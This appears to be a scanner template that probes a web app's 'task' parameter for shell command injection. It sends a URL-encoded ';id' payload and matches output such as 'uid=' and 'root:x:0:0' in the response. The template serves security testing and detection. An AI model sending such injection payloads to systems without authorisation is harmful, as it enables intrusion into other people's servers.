id: cmdi6-0572
name: 'Shell injection in task'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via task'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      task:
        - '%3bid'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
